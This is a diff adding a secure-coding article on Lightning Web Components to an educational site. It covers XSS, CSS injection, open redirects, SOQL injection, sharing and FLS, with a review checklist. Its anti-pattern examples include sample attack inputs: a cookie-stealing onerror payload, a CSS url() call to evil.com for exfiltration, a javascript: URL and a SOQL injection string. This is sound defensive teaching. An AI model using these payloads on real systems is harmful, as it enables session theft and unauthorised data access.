+this.template.querySelector('.container').innerHTML = `
+  &lt;p&gt;Hello, ${this.userName}!&lt;/p&gt;
+`; // If userName = '&lt;img onerror="exfil(document.cookie)"&gt;' — attack succeeds
+
+// ✅ Correct: Use LWC data binding — the template engine auto-escapes
+// In the template: &lt;p&gt;Hello, {userName}!&lt;/p&gt;
+// LWC renders this as text, not HTML. Attack string appears as literal text.</code></pre>
+        <p>
+          The only case where dynamic HTML is arguably acceptable is when the content is
+          authored by a trusted administrator (e.g. Rich Text field values). Even then, use
+          the <code>lightning-formatted-rich-text</code> base component, which handles
+          sanitisation internally.
+        </p>
+
+        <h3 id="ap-user-css">Trusting User-Supplied CSS</h3>
+        <p>
+          CSS can be used to exfiltrate data (CSS Injection / Exfil attacks) and to perform
+          clickjacking. Never allow user input to be written into a <code>&lt;style&gt;</code>
+          tag or a <code>style</code> attribute:
+        </p>
+        <pre><code class="language-javascript">// ❌ Anti-pattern: injecting user CSS
+element.setAttribute('style', this.userProvidedStyle);
+// e.g. userProvidedStyle = 'background: url(https://evil.com/exfil?data=...)'
+
+// ✅ Correct: use a whitelist of known CSS properties, or use CSS custom properties
+// whose values you control and simply allow the user to choose from predefined options</code></pre>
+
+        <h3 id="ap-document">document.addEventListener Anti-Pattern</h3>
+        <p>
+          Adding event listeners on <code>document</code> from inside an LWC component is
+          problematic for multiple reasons:
+        </p>
+        <ul>
+          <li>Event listeners on <code>document</code> are not automatically removed when the component is disconnected, causing memory leaks</li>
+          <li>Under LWS, cross-namespace components may not be able to see each other's events via <code>document</code></li>
+          <li>Events from <code>document</code> can be fired by any code on the page, including malicious third-party code</li>
+        </ul>
+        <pre><code class="language-javascript">// ❌ Anti-pattern: document-level listener that is never removed
+connectedCallback() {
+  document.addEventListener('keydown', this.handleKey.bind(this));
+}
+
+// ✅ Correct: attach to template, clean up on disconnect
+connectedCallback() {
+  this.template.addEventListener('keydown', this.handleKey);
+}
+disconnectedCallback() {
+  this.template.removeEventListener('keydown', this.handleKey);
+}
+
+// ✅ For cross-component communication: use LMS instead
+// See Article 08 — Component Communication</code></pre>
+
+        <h3 id="ap-window-open">window.open and Unvalidated URLs</h3>
+        <p>
+          Never call <code>window.open()</code> with a URL derived directly from user input
+          or a record field without validation. This can lead to open redirect vulnerabilities
+          where the user is sent to a phishing site, or to JavaScript injection via
+          <code>javascript:</code> URLs.
+        </p>
+        <pre><code class="language-javascript">// ❌ Anti-pattern: unvalidated URL from user input
+window.open(this.recordData.Website__c); // Could be 'javascript:stealData()'
+
+// ✅ Correct: validate URL scheme before opening
+openWebsite() {
+  const url = this.recordData.Website__c;
+  if (url &amp;&amp; (url.startsWith('https://') || url.startsWith('http://'))) {
+    window.open(url, '_blank', 'noopener,noreferrer');
+  }
+}
+
+// The noopener attribute prevents the new window from accessing window.opener
+// The noreferrer attribute prevents sending the Referer header</code></pre>
+
+        <h3 id="ap-apex-exposure">Over-Exposed Apex Methods</h3>
+        <p>
+          Every <code>@AuraEnabled</code> method is a callable endpoint from any component
+          on any Lightning page — including pages in other namespaces. Treat them like REST
+          API endpoints. Apply the principle of least privilege:
+        </p>
+        <ul>
+          <li>Validate all input parameters — never trust client-supplied IDs, types, or filters without checking them server-side</li>
+          <li>Never pass SOQL fragments from the client — use bind variables instead</li>
+          <li>Apply <code>with sharing</code> unless you have a deliberate reason not to</li>
+          <li>Apply <code>stripInaccessible</code> for all returned data</li>
+          <li>Do not expose admin-only operations through <code>@AuraEnabled</code> without an explicit permission check</li>
+        </ul>
+        <pre><code class="language-apex">// ❌ Anti-pattern: SOQL injection via concatenation
+@AuraEnabled
+public static List&lt;Account&gt; search(String filter) {
+    // If filter = "' OR name != '"
+    // Full SOQL injection — returns all accounts
+    return Database.query('SELECT Id, Name FROM Account WHERE Name = \'' + filter + '\'');
+}
+
+// ✅ Correct: use bind variables, which are always treated as literals
+@AuraEnabled
+public static List&lt;Account&gt; search(String filter) {
+    String likePattern = '%' + String.escapeSingleQuotes(filter) + '%';
+    return [SELECT Id, Name FROM Account WHERE Name LIKE :likePattern LIMIT 50];
+}</code></pre>
+      </section>
+
+      <!-- ============================================================
+           SECTION 8 — PITFALLS
+           ============================================================ -->
+      <section id="pitfalls">
+        <h2>8. Pitfall Catalogue</h2>
+
+        <div class="callout callout--pitfall">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ⚠ Pitfall 1: Assuming LWS sanitises innerHTML so it's safe to use
+          </div>
+          <div class="callout__body">
+            <p>
+              LWS applies API distortions that mitigate some <code>innerHTML</code> injection.
+              But this is a defence-in-depth layer, not a licence to write insecure code. LWS
+              behaviour can change across Salesforce releases, and you have no control over that.
+              Always prefer LWC data binding over <code>innerHTML</code> — the binding model
+              provides guaranteed text escaping.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--pitfall">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ⚠ Pitfall 2: Forgetting that getRecord silently omits FLS-blocked fields
+          </div>
+          <div class="callout__body">
+            <p>
+              <code>getRecord</code> does not throw when a field is blocked by FLS — it simply
+              omits it. Developers often assume the absence of an error means the field was
+              retrieved. This causes subtle UI bugs (fields showing as blank) that only appear
+              for certain user profiles. Always treat field values as potentially undefined
+              and use <code>getFieldValue</code> with a fallback.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--pitfall">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ⚠ Pitfall 3: Apex class declared without 'with sharing'
+          </div>
+          <div class="callout__body">
+            <p>
+              Classes without an explicit sharing declaration default to <code>without
+              sharing</code> behaviour in some contexts. Always be explicit. Every Apex class
+              called from an LWC should declare <code>with sharing</code> unless you have a
+              documented reason. Record-level security violations are the most common security
+              audit finding in LWC codebases.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--pitfall">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ⚠ Pitfall 4: Loading third-party libraries from a CDN URL in LWC
+          </div>
+          <div class="callout__body">
+            <p>
+              Loading JavaScript from an external CDN (e.g. <code>https://cdn.jsdelivr.net/...</code>)
+              violates Salesforce's CSP unless that domain is explicitly added to CSP Trusted Sites.
+              Even if you add the trusted site, loading from a third-party CDN means your app depends
+              on that CDN's availability and integrity. If the CDN is compromised (CDN supply chain
+              attack), malicious code runs in your org. Download libraries and serve from Static Resources.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--pitfall">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ⚠ Pitfall 5: Using document.querySelector to reach another namespace's component
+          </div>
+          <div class="callout__body">
+            <p>
+              Under LWS, each namespace is isolated in its own realm. Querying
+              <code>document.querySelector('foreign-namespace-component')</code> may return null
+              or a restricted wrapper rather than the live element. This pattern is architecturally
+              wrong anyway — it creates tight coupling between components. Use events, LMS, or
+              <code>@api</code> methods for inter-component communication.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--pitfall">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ⚠ Pitfall 6: Sending sensitive data in custom event detail without encryption
+          </div>
+          <div class="callout__body">
+            <p>
+              Custom events with <code>composed: true</code> propagate up through the shadow DOM
+              and can be intercepted by any parent component. Any namespace-level code that listens
+              on <code>document</code> can potentially see these events. Never put sensitive data
+              (passwords, SSNs, PII) in event <code>detail</code>. Use the minimum data necessary
+              (e.g. a record ID, not the full record data).
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================================================
+           SECTION 9 — EXPERT INSIGHT
+           ============================================================ -->
+      <section id="p3-insight">
+        <h2>9. Expert Insight</h2>
+
+        <div class="callout callout--insight">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ★ Expert Insight: Designing Security In, Not Bolted On
+          </div>
+          <div class="callout__body">
+            <p>
+              The common junior-developer approach is to write the happy path first and add
+              security checks later. A expert architect reverses this — security is built into the
+              data model, the component API contract, and the Apex layer from the start:
+            </p>
+            <ul>
+              <li>
+                <strong>Data layer:</strong> LDS adapters for standard operations (automatic FLS),
+                <code>Security.stripInaccessible</code> for all Apex queries.
+              </li>
+              <li>
+                <strong>Component API contract:</strong> <code>@api</code> properties receive
+                IDs, not full objects. Components fetch their own data rather than receiving
+                pre-fetched payloads that bypass LDS.
+              </li>
+              <li>
+                <strong>Apex contract:</strong> <code>with sharing</code> everywhere, bind
+                variables for all SOQL, CRUD/FLS checks for all mutations.
+              </li>
+              <li>
+                <strong>Output layer:</strong> LWC data binding for all dynamic output — never
+                <code>innerHTML</code> with user-controlled content.
+              </li>
+            </ul>
+            <p>
+              This "security by design" approach means a security audit produces zero critical
+              findings because the architecture itself prevents the vulnerabilities.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--insight">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ★ Expert Insight: LWS Migration Debugging Strategy
+          </div>
+          <div class="callout__body">
+            <p>
+              When migrating a complex org from Locker to LWS, broken behaviour is typically
+              in one of three categories:
+            </p>
+            <ol>
+              <li>
+                <strong>Cross-namespace DOM access:</strong> Code that used to silently fail
+                under Locker (returning a wrapper) may now behave differently under LWS realms.
+                Fix: refactor to use <code>@api</code> methods or events.
+              </li>
+              <li>
+                <strong>Prototype chain manipulation:</strong> Code that used
+                <code>Object.setPrototypeOf</code> or direct <code>__proto__</code> assignment
+                may break under LWS realm isolation. Fix: use composition instead of
+                prototype manipulation.
+              </li>
+              <li>
+                <strong>Library initialisation assumptions:</strong> Some libraries assume they
+                can find global state on <code>window</code> that was set by another library.
+                Under LWS, each namespace's <code>window</code> is sandboxed. Fix: load
+                dependent libraries in the same namespace and ensure correct load order via
+                <code>Promise.all([loadScript(...), loadScript(...)])</code>.
+              </li>
+            </ol>
+            <p>
+              Enable LWS in a scratch org first and run your full test suite. The browser console
+              will log LWS violations with the namespace and API that triggered them. Treat each
+              violation as an architectural signal to fix coupling.
+            </p>
+          </div>
+        </div>
+
+        <div class="callout callout--insight">
+          <div class="callout__header" aria-expanded="true" role="button" tabindex="0">
+            ★ Expert Insight: The Principle of Least Privilege in LWC Architecture
+          </div>
+          <div class="callout__body">
+            <p>
+              Every <code>@AuraEnabled</code> Apex method, every wire adapter call, and every
+              LMS message channel is an attack surface. A expert architect applies the principle
+              of least privilege at every layer:
+            </p>
+            <ul>
+              <li>Wire adapters request only the fields they display — not <code>SELECT *</code></li>
+              <li>Apex methods accept only the minimum parameters needed</li>
+              <li>LMS message channels are defined with the most restrictive scope possible</li>
+              <li>Custom permissions guard admin-only operations in both Apex and LWC UI</li>
+            </ul>
+            <p>
+              In LWC, use <code>@salesforce/customPermission/PermName</code> to conditionally
+              show UI elements that should only be visible to authorised users — and also
+              enforce the same permission in Apex (never rely solely on UI-level hiding):
+            </p>
+            <pre><code class="language-javascript">// js
+import { LightningElement } from 'lwc';
+import HAS_DELETE_PERMISSION from '@salesforce/customPermission/Delete_Records';
+
+export default class RecordActions extends LightningElement {
+  get canDelete() {
+    return HAS_DELETE_PERMISSION;
+  }
+}</code></pre>
+            <pre><code class="language-html">&lt;!-- template --&gt;
+&lt;template&gt;
+  &lt;lightning-button
+    lwc:if={canDelete}
+    label="Delete"
+    onclick={handleDelete}
+  &gt;&lt;/lightning-button&gt;
+&lt;/template&gt;</code></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================================================
+           SECTION 10 — SECURITY CODE REVIEW CHECKLIST
+           ============================================================ -->
+      <section id="checklist">
+        <h2>10. Security Code Review Checklist</h2>
+        <p>
+          Use this checklist when reviewing any LWC pull request for security concerns:
+        </p>
+
+        <h3>JavaScript / LWC</h3>
+        <ul>
+          <li>☐ No uses of <code>innerHTML</code> with dynamic/user-controlled content</li>
+          <li>☐ No <code>eval()</code>, <code>new Function()</code>, or <code>setTimeout(string)</code></li>
+          <li>☐ No third-party scripts loaded from external CDN URLs (must be Static Resources)</li>
+          <li>☐ <code>window.open()</code> validates URL scheme before calling</li>
+          <li>☐ <code>window.open()</code> uses <code>noopener,noreferrer</code> rel attributes</li>
+          <li>☐ No <code>document.addEventListener</code> without corresponding <code>removeEventListener</code> in <code>disconnectedCallback</code></li>
+          <li>☐ Custom events with <code>composed: true</code> contain no sensitive data in <code>detail</code></li>
+          <li>☐ No <code>@api</code> properties accept full record objects (IDs only, let the component fetch)</li>
+          <li>☐ Custom permission guards protect admin-only UI elements</li>
+        </ul>
+
+        <h3>Apex</h3>
+        <ul>
+          <li>☐ All <code>@AuraEnabled</code> classes declare <code>with sharing</code></li>
+          <li>☐ All SOQL queries use bind variables (no string concatenation)</li>
+          <li>☐ <code>Security.stripInaccessible</code> applied to all returned data</li>
+          <li>☐ All input parameters are validated server-side (types, ranges, formats)</li>
+          <li>☐ Custom permission or Profile check for admin-only operations</li>
+          <li>☐ No <code>without sharing</code> unless documented and justified</li>
+        </ul>
+
+        <h3>Architecture</h3>
+        <ul>
+          <li>☐ LDS wire adapters used for standard CRUD (not Apex for simple reads)</li>
+          <li>☐ Wire fields list is specific (no schema wildcard requests)</li>
+          <li>☐ LMS message channels do not carry full SObject data payloads</li>
+          <li>☐ No tight coupling through <code>document.querySelector</code> across components</li>
+          <li>☐ Static Resources used for all third-party libraries</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================
+           SECTION 11 — QUICK RECALL CARD
+           ============================================================ -->
+      <section id="recall">
+        <h2>11. Quick Recall Card</h2>
+        <div class="recall-card">
+          <div class="recall-grid">
+
+            <div class="recall-item">
+              <div class="recall-label">XSS Prevention in LWC</div>
+              <div class="recall-value">
+                Use <code>{binding}</code> in templates (auto-escapes text). Never use
+                <code>innerHTML</code> with dynamic content. Use
+                <code>lightning-formatted-rich-text</code> for admin-authored HTML.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">Locker vs LWS</div>
+              <div class="recall-value">
+                Locker: proxy wrappers, slow, blocks custom elements, deprecated for LWC.<br>
+                LWS: JS realms + API distortions, faster, standards-aligned, default since Winter '23.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">CSP in Salesforce</div>
+              <div class="recall-value">
+                No <code>unsafe-inline</code> for scripts. No <code>eval()</code>. Load
+                third-party JS via Static Resources + <code>platformResourceLoader</code>.
+                "Stricter CSP" is now default in new orgs.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">FLS via LDS</div>
+              <div class="recall-value">
+                <code>getRecord</code> silently omits FLS-blocked fields (no error!).
+                Guard with <code>getFieldValue</code> + undefined fallback.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">FLS in Apex</div>
+              <div class="recall-value">
+                Apex does NOT enforce FLS automatically. Use
+                <code>Security.stripInaccessible(AccessType.READABLE, records)</code>.
+                Always declare <code>with sharing</code>.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">SOQL Injection Prevention</div>
+              <div class="recall-value">
+                Always use bind variables: <code>WHERE Name = :inputVar</code>.<br>
+                Never concatenate user input into a SOQL string.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">window.open Security</div>
+              <div class="recall-value">
+                Validate URL starts with <code>https://</code> or <code>http://</code>.<br>
+                Use <code>noopener,noreferrer</code> to prevent window.opener access.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">Custom Permissions in LWC</div>
+              <div class="recall-value">
+                Import: <code>@salesforce/customPermission/PermName</code>.<br>
+                Returns boolean. Gate UI AND Apex (never gate one without the other).
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">LWS Trusted Mode</div>
+              <div class="recall-value">
+                Relaxed LWS distortions for vetted namespaces. Must be granted by Salesforce.
+                Not self-configurable for custom org code.
+              </div>
+            </div>
+
+            <div class="recall-item">
+              <div class="recall-label">document.addEventListener Cleanup</div>
+              <div class="recall-value">
+                If you must listen on document/window, always remove the listener in
+                <code>disconnectedCallback()</code>. Prefer <code>this.template</code>
+                listeners to avoid cross-namespace issues under LWS.
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================================================
+           ARTICLE NAV (Prev / Next)
+           ============================================================ -->
+      <nav class="article-nav" aria-label="Article navigation">
+        <a href="12-slds-styling.html" class="nav-prev">
+          ← Article 12: Styling with SLDS
+        </a>
+        <a href="14-performance.html" class="nav-next">
+          Article 14: Performance Optimization →
+        </a>
+      </nav>
+
+    </main>
+  </div><!-- /.article-page -->
+
+  <!-- ================================================================
+       FOOTER
+       ================================================================ -->
+  <footer class="site-footer" role="contentinfo">
+    <div class="site-footer__inner">
+      <p>LWC.guide — Built for Expert-Level Proficiency</p>
+      <p>
+        References:
+        <a href="https://developer.salesforce.com/docs/platform/lightning-components-security/guide/lws-intro.html" target="_blank" rel="noopener noreferrer">Lightning Web Security Docs</a> ·
+        <a href="https://developer.salesforce.com/docs/platform/lightning-components-security/guide/get-started-compare-lws-locker.html" target="_blank" rel="noopener noreferrer">LWS vs Locker Comparison</a> ·
+        <a href="https://developer.salesforce.com/docs/platform/lightning-components-security/guide/content-security-policy-stricter.html" target="_blank" rel="noopener noreferrer">Stricter CSP Docs</a>
+      </p>
+          <p class="footer-disclaimer">
+        Lightning Web Components (LWC) and Salesforce are trademarks of Salesforce, Inc.
+        This site is an independent educational resource and is not affiliated with,
+        endorsed by, or sponsored by Salesforce, Inc.
+      </p>
+      <p class="footer-copyright">&#169; 2026 Mohak Purushottam Pingle. Content licensed under MIT.</p>
+    </div>
+  </footer>
+
+  <!-- ================================================================
+       SCRIPTS
+       ================================================================ -->
+  <script src="../assets/prism.min.js"></script>
+  <script src="../assets/prism-javascript.min.js"></script>
+  <script src="../assets/prism-markup.min.js"></script>
+  <script src="../assets/prism-css.min.js"></script>
+  <script src="../assets/prism-json.min.js"></script>
+  <script src="../assets/prism-apex.min.js" onerror="void 0"></script>
+  <script src="../search.js"></script>
+
+  <script>
+    // ----------------------------------------------------------------
+    // 1. Dark / Light Theme Toggle
+    // ----------------------------------------------------------------
+    (function () {
+      const html      = document.documentElement;
+      const btn       = document.getElementById('themeToggle');
+      const label     = document.getElementById('themeLabel');
+      const STORE_KEY = 'lwc-blog-theme';
+
+      function applyTheme(theme) {
+        html.setAttribute('data-theme', theme);
+        label.textContent = theme === 'dark' ? 'Light' : 'Dark';
+      }
+
+      try {
+        const saved = localStorage.getItem(STORE_KEY);
+        if (saved) applyTheme(saved);
+      } catch { /* */ }
+
+      btn.addEventListener('click', () => {
+        const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+        applyTheme(next);
+        try { localStorage.setItem(STORE_KEY, next); } catch { /* */ }
+      });
+    })();
+
+    // ----------------------------------------------------------------
+    // 2. Mark as Read
+    // ----------------------------------------------------------------
+    (function () {
+      const btn = document.getElementById('markReadBtn');
+      if (!btn) return;
+
+      const articleId = btn.dataset.articleId;
+      const key       = 'lwc-article-read-' + articleId;
+
+      function syncBtn(isRead) {
+        btn.setAttribute('aria-pressed', String(isRead));
+        btn.textContent = isRead ? '✓ Read' : 'Mark as Read';
+        btn.classList.toggle('mark-read-btn--done', isRead);
+      }
+
+      try {
+        const wasRead = localStorage.getItem(key) === 'true';
+        syncBtn(wasRead);
+      } catch { /* */ }
+
+      btn.addEventListener('click', () => {
+        try {
+          const wasRead = localStorage.getItem(key) === 'true';
+          localStorage.setItem(key, (!wasRead).toString());
+          syncBtn(!wasRead);
+        } catch { /* */ }
+      });
+    })();
+
+    // ----------------------------------------------------------------
+    // 3. Collapsible Callout Boxes
+    // ----------------------------------------------------------------
+    (function () {
+      document.querySelectorAll('.callout__header').forEach(header => {
+        header.addEventListener('click', () => {
+          const body    = header.nextElementSibling;
+          const isOpen  = header.getAttribute('aria-expanded') === 'true';
+          header.setAttribute('aria-expanded', String(!isOpen));
+          body.style.display = isOpen ? 'none' : '';
+        });
+
+        header.addEventListener('keydown', e => {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            header.click();
+          }
+        });
+      });
+    })();
+
+    // ----------------------------------------------------------------
+    // 4. Scroll-Spy TOC
+    // ----------------------------------------------------------------
+    (function () {
+      const sections = document.querySelectorAll('section[id]');
+      const tocLinks = document.querySelectorAll('.toc-list a');
+
+      if (!sections.length || !tocLinks.length) return;
+
+      const observer = new IntersectionObserver(entries => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            tocLinks.forEach(a => a.classList.remove('active'));
+            const active = document.querySelector(`.toc-list a[href="#${entry.target.id}"]`);
+            if (active) active.classList.add('active');
+          }
+        });
+      }, { rootMargin: '-20% 0px -70% 0px' });
+
+      sections.forEach(s => observer.observe(s));
+    })();
+  </script>
+
+</body>
+</html>
